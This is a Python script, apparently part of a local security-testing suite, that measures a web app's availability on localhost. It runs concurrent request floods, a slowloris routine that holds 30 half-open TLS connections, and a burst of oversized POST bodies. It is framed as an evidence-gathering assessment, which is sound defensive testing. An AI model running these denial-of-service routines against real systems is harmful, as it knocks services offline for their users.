#!/usr/bin/env python3
"""22 压力与慢连接：公开页并发、慢速请求占位、超大请求体，观察可用性影响（限幅运行）。"""
import asyncio
import json
import os
import socket
import ssl
import statistics
import time

import httpx

BASE = os.environ.get("BF_BASE", "https://localhost:8603")
HOST, PORT = "127.0.0.1", 8603
EV = "/tmp/sj-attacker/evidence-bf"
os.makedirs(EV, exist_ok=True)
RES = {}


def note(k, v):
    RES[k] = v
    print(f"[{k}] {json.dumps(v, ensure_ascii=False)[:700]}")


def pct(xs, p):
    if not xs:
        return None
    xs = sorted(xs)
    i = min(len(xs) - 1, max(0, int(round(p / 100 * len(xs))) - 1))
    return round(xs[i], 1)


async def load_run(path, n_workers, seconds):
    limits = httpx.Limits(max_connections=n_workers, max_keepalive_connections=n_workers)
    lat, errs, codes = [], 0, {}
    stop = time.perf_counter() + seconds

    async with httpx.AsyncClient(verify=False, limits=limits, timeout=15) as c:
        async def worker():
            nonlocal errs
            while time.perf_counter() < stop:
                t0 = time.perf_counter()
                try:
                    r = await c.get(BASE + path)
                    lat.append((time.perf_counter() - t0) * 1000)
                    codes[r.status_code] = codes.get(r.status_code, 0) + 1
                except Exception:
                    errs += 1
        await asyncio.gather(*[worker() for _ in range(n_workers)])
    return {"requests": len(lat) + errs, "errors": errs, "codes": codes,
            "p50_ms": pct(lat, 50), "p95_ms": pct(lat, 95), "p99_ms": pct(lat, 99),
            "rps": round((len(lat) + errs) / seconds, 1)}


def slowloris_open(count, hold_seconds):
    ctx = ssl._create_unverified_context()
    socks = []
    for i in range(count):
        try:
            s = socket.create_connection((HOST, PORT), timeout=5)
            ss = ctx.wrap_socket(s, server_hostname="localhost")
            ss.sendall(b"GET / HTTP/1.1\r\nHost: localhost:8603\r\n")
            socks.append(ss)
        except Exception:
            pass
    t_end = time.time() + hold_seconds
    while time.time() < t_end:
        for ss in socks:
            try:
                ss.sendall(b"X-Pad: a\r\n")
            except Exception:
                pass
        time.sleep(3)
    for ss in socks:
        try:
            ss.close()
        except Exception:
            pass
    return len(socks)


def normal_probe(n=8):
    lat = []
    with httpx.Client(verify=False, timeout=10) as c:
        for _ in range(n):
            t0 = time.perf_counter()
            r = c.get(BASE + "/")
            lat.append((time.perf_counter() - t0) * 1000)
            time.sleep(0.3)
    return {"n": len(lat), "p50_ms": pct(lat, 50), "max_ms": round(max(lat), 1),
            "codes_ok": "200"}


def main():
    note("baseline_normal", normal_probe())
    note("load_root_50c_20s", asyncio.run(load_run("/", 50, 20)))
    note("load_health_80c_10s", asyncio.run(load_run("/api/health/", 80, 10)))

    # 慢连接占位：30 个半开连接持续 40 秒，同时测正常延迟
    import threading
    holder = {}
    th = threading.Thread(target=lambda: holder.update({"opened": slowloris_open(30, 40)}))
    th.start()
    time.sleep(2)
    during = normal_probe(6)
    th.join()
    note("slowloris_during_normal_probe", {"opened": holder.get("opened"), **during})

    # 超大请求体并发
    async def big_body():
        async with httpx.AsyncClient(verify=False, timeout=30) as c:
            async def one(i):
                try:
                    r = await c.post(BASE + "/api/reports/",
                                     data={"title": "big", "body": "A" * (1024 * 1024 + 2048)},
                                     headers={"Origin": "https://localhost:8603"})
                    return r.status_code
                except Exception as e:
                    return type(e).__name__
            return await asyncio.gather(*[one(i) for i in range(20)])
    codes = asyncio.run(big_body())
    note("big_body_20_concurrent", {"codes": {str(k): codes.count(k) for k in set(codes)}})

    with open(EV + "/22-load.json", "w") as f:
        json.dump(RES, f, ensure_ascii=False, indent=2)


if __name__ == "__main__":
    main()
